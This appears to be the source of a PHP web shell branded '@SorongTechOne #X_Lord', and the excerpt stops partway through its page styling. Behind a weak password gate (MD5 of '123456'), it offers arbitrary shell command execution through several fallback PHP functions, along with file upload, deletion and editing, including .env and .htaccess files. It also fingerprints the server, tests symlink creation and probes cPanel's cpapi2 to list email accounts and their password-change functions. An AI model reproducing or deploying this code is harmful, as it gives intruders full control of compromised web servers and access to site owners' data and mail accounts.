<?php session_start();$password_hash='e10adc3949ba59abbe56e057f20f883e';$is_logged_in=false;if(isset($_SESSION['logged_in'])&&$_SESSION['logged_in']===true){$is_logged_in=true;}if(isset($_POST['login'])){$input_password=isset($_POST['password'])?$_POST['password']:'';if(md5($input_password)===$password_hash){$_SESSION['logged_in']=true;$is_logged_in=true;}else{echo "<script>alert('Password salah!');</script>";}}if(isset($_GET['logout'])){session_destroy();header('Location: '.$_SERVER['PHP_SELF']);exit;}if(!$is_logged_in){ ?><!doctypehtml><html lang="en"><head><meta charset="UTF-8"><title>@SorongTechOne - Login</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"rel="stylesheet"><style>body{background:#000!important;color:#fff!important;font-family:Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center}.login-card{background:#111;border:2px solid red;border-radius:10px;padding:30px;width:100%;max-width:400px}.login-card h2{color:red;text-align:center;margin-bottom:30px}.form-control{background:#222!important;border:1px solid #444!important;color:#fff!important;margin-bottom:15px}.form-control:focus{border-color:red!important;box-shadow:0 0 0 .25rem rgba(255,0,0,.25)!important}.btn-login{background:red!important;border:none;width:100%;padding:10px;font-weight:700}.btn-login:hover{background:#c00!important}</style></head><body><div class="login-card"><h2>(@SorongTechOne) #X_Lord</h2><form action=""method="POST"><div class="mb-3"><input name="password"type="password"class="form-control"required placeholder="Enter Password"></div><button class="btn btn-login"name="login"type="submit">🔑 LOGIN</button><div class="text-center mt-3 text-muted"><small>Default: 123456</small></div></form></div></body></html><?php exit;}function proc_exec($command){$descriptorspec=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$process=@proc_open($command,$descriptorspec,$pipes);if(!is_resource($process)){return "ERROR: Gagal menjalankan proc_open()";}fclose($pipes[0]);$stdout=stream_get_contents($pipes[1]);$stderr=stream_get_contents($pipes[2]);fclose($pipes[1]);fclose($pipes[2]);$return_value=proc_close($process);if(!empty($stderr)){return trim($stderr);}return trim($stdout);}function safe_exec($command){$result=proc_exec($command);if(strpos($result,'ERROR')!==false||empty($result)){if(function_exists('shell_exec')){$result=@shell_exec($command);}elseif(function_exists('exec')){@exec($command,$output,$return_var);$result=implode("\n",$output);}elseif(function_exists('system')){ob_start();@system($command);$result=ob_get_clean();}elseif(function_exists('passthru')){ob_start();@passthru($command);$result=ob_get_clean();}}return $result?trim($result):"Command failed or no output";}$path=isset($_GET['path'])?$_GET['path']:__DIR__;$real=realpath($path);if($real===false)$real=__DIR__;$path=$real;$uploadMsg="";$actionMsg="";if(isset($_POST["upload"])&&isset($_FILES["file"])){$targetDir=$path.DIRECTORY_SEPARATOR;$targetFile=$targetDir.basename($_FILES["file"]["name"]);if(move_uploaded_file($_FILES["file"]["tmp_name"],$targetFile)){$uploadMsg="<span class='text-success'>✅ File berhasil diupload ke $path</span>";}else{$uploadMsg="<span class='text-danger'>❌ Gagal upload file!</span>";}}if(isset($_GET['delete'])){$delFile=$path.DIRECTORY_SEPARATOR.basename($_GET['delete']);if(is_file($delFile)){if(@unlink($delFile)){$actionMsg="<span class='text-success'>🗑️ File berhasil dihapus!</span>";}else{$actionMsg="<span class='text-danger'>❌ Gagal hapus file!</span>";}}}if(isset($_POST['save_file'])&&isset($_POST['filename'])){$editFile=$path.DIRECTORY_SEPARATOR.basename($_POST['filename']);$content=isset($_POST['content'])?$_POST['content']:"";if(is_file($editFile)){if(file_put_contents($editFile,$content)!==false){$actionMsg="<span class='text-success'>✏️ File berhasil disimpan!</span>";}else{$actionMsg="<span class='text-danger'>❌ Gagal simpan file!</span>";}}}$items=@scandir($path)?:[];$folders=[];$files=[];foreach($items as $item){if($item===".")continue;$full=$path.DIRECTORY_SEPARATOR.$item;if(is_dir($full)){$folders[]=$item;}else{$files[]=$item;}}$list=array_merge($folders,$files);$parent=dirname($path);$system=["OS"=>php_uname("s")." ".php_uname("r"),"Host"=>php_uname("n"),"Arch"=>php_uname("m"),"PHP"=>phpversion(),"Server"=>isset($_SERVER["SERVER_SOFTWARE"])?$_SERVER["SERVER_SOFTWARE"]:"CLI / Unknown"];$symlinkTest=false;$symlinkTestPath=$path.DIRECTORY_SEPARATOR.'test_symlink_'.time();if(@symlink(__FILE__,$symlinkTestPath)&&is_link($symlinkTestPath)){$symlinkTest=true;@unlink($symlinkTestPath);}$pythonVersion=safe_exec('python --version 2>&1');if(empty($pythonVersion)||strpos($pythonVersion,'not found')!==false){$pythonVersion=safe_exec('python3 --version 2>&1');}if(empty($pythonVersion)||strpos($pythonVersion,'not found')!==false){$pythonVersion="Tidak terdeteksi";}$rubyVersion=safe_exec('ruby --version 2>&1');if(empty($rubyVersion)||strpos($rubyVersion,'not found')!==false){$rubyVersion="Tidak terdeteksi";}$nodeVersion=safe_exec('node --version 2>&1');if(empty($nodeVersion)||strpos($nodeVersion,'not found')!==false){$nodeVersion=safe_exec('nodejs --version 2>&1');}if(empty($nodeVersion)||strpos($nodeVersion,'not found')!==false){$nodeVersion="Tidak terdeteksi";}$cpapi2Test=safe_exec('cpapi2 --output=json StatsBar getrowcounter 2>&1');$hasCpapi2=(strpos($cpapi2Test,'json')!==false||strpos($cpapi2Test,'{"')!==false);$emailList=[];$emailFunctions=['listpops'=>false,'passwdpop'=>false,'change_password'=>false];if($hasCpapi2){$apiList=safe_exec('cpapi2 --help 2>&1');$emailFunctions['listpops']=true;$emailFunctions['passwdpop']=strpos($apiList,'Email::passwdpop')!==false;$emailFunctions['change_password']=strpos($apiList,'Passwd::change_password')!==false;$emailJson=safe_exec('cpapi2 --output=json Email listpops 2>&1');if($emailJson){$emailData=@json_decode($emailJson,true);if(isset($emailData['cpanelresult']['data'])&&is_array($emailData['cpanelresult']['data'])){foreach($emailData['cpanelresult']['data']as $email){if(isset($email['email'])){$emailList[]=['email'=>$email['email'],'login'=>isset($email['login'])?$email['login']:'','status'=>($email['suspended_incoming']==0&&$email['suspended_login']==0)?'Aktif':'Suspended'];}}}}}$execMethods=[];$methodsToTest=['proc_open'=>'proc_open','shell_exec'=>'shell_exec','exec'=>'exec','system'=>'system','passthru'=>'passthru','popen'=>'popen'];foreach($methodsToTest as $name=>$func){$execMethods[$name]=function_exists($func)?'✓':'✗';}$editMode=false;$editFileContent="";$editFileName="";if(isset($_GET['edit'])){$editFileName=basename($_GET['edit']);$editFilePath=$path.DIRECTORY_SEPARATOR.$editFileName;$ext=strtolower(pathinfo($editFileName,PATHINFO_EXTENSION));if(is_file($editFilePath)&&in_array($ext,['php','txt','html','js','css','json','xml','sql','md','py','rb','sh','bash','env','htaccess'])){$editMode=true;$editFileContent=htmlspecialchars(file_get_contents($editFilePath));}} ?><!doctypehtml><html lang="en"><head><meta charset="UTF-8"><title>@SorongTechOne</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"rel="stylesheet"><style>body{background:#000!important;color:#fff!important;font-family:Arial,sans-serif}.card{background:#111!important;border:2px solid red!important;max-width:95vw}.table-container{max-height:55vh;overflow-y:auto}.table{background:#222!important;margin:0}.table thead{background:red!important;color:#fff!important;position:sticky;top:0;z-index:1}.table-dark{--bs-table-bg:#222222!important;--bs-table-striped-bg:#2c2c2c!important;--bs-table-striped-color:#ffffff!important;--bs-table-active-bg:#373b3e!important;--bs-table-active-color:#ffffff!important;--bs-table-hover-bg:#323539!important;--bs-table-hover-color:#ffffff!important;color:#fff!important;border-color:#373b3e!important}.folder{color:#f55!important;font-weight:700}.file{color:#ddd!important}a{text-decoration:none;color:inherit!important}a:hover{color:#f55!im